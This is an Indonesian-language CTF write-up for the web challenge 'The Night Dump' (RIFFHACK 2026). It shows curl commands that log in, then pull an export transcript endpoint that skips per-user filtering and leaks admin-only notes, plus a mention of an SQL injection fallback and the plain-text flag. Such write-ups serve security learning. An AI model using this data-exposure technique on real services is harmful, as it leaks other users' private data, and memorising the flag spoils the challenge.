---
ctf: "RIFFHACK 2026"
kategori: "Web"
challenge: "The Night Dump"
flag: "bitflag{3xp0rts_sh0uld_n0t_b3_0p3n_b00ks}"
teknik: "?format=transcript pada /api/support/chat membuang filter scope-user dan mengembalikan baris mentah termasuk internalNote admin-only"
sumber: "https://github.com/Abdelkad3r/RIFFHACK/tree/main/08-the-night-dump"
---

# The Night Dump — RIFFHACK 2026 (Web)

## Deskripsi Singkat

`GET /api/support/chat?format=transcript` adalah cabang "export transcript-ku" yang membuang filter scope-user dan mengembalikan baris mentah termasuk kolom `internalNote` admin-only. String flag-nya adalah brief-nya, dalam bentuk plaintext.

## Eksploitasi / Solusi

```bash
COOKIE=$(curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"email":"a@b.c","password":"x"}' -D - http://<host>/api/auth/login \
  | awk -F'[=;]' '/auth-token/{print "auth-token="$2}')

curl -s -b "$COOKIE" -X POST -H 'Content-Type: application/json' \
  -d '{"message":"hi"}' http://<host>/api/support/chat

curl -s -b "$COOKIE" "http://<host>/api/support/chat?format=transcript" \
     | grep -oE 'bitflag\{[^}]+\}'
# bitflag{3xp0rts_sh0uld_n0t_b3_0p3n_b00ks}
```

Baris seed `support-seed-a16` hidup di tabel yang sama dengan pesan milik user. Cabang export-nya menjalankan `db.supportChatMessage.findMany({ where: {} })` tanpa filter `userId` dan mengembalikan baris mentah termasuk `internalNote`.

**Fallback lewat pivot SQLi:** kalau endpoint transcript-nya 500, baris yang sama bisa dijangkau lewat SQLi web3 dengan query `SupportChatMessage WHERE id='support-seed-a16'`.

## Catatan / Insight

Ini instance ketiga dari "string sama, asli di sini, umpan di tempat lain" di event ini. Nilai `bitflag{3xp0rts_sh0uld_n0t_b3_0p3n_b00ks}` adalah salah satu dari empat umpan yang dikejar di web5 (lewat pivot SQLi yang sama persis), dan di sini ia jawaban asli karena brief-nya menunjuk ke permukaan export-transcript-yang-kelebihan-scope.

## Flag

```
bitflag{3xp0rts_sh0uld_n0t_b3_0p3n_b00ks}
```
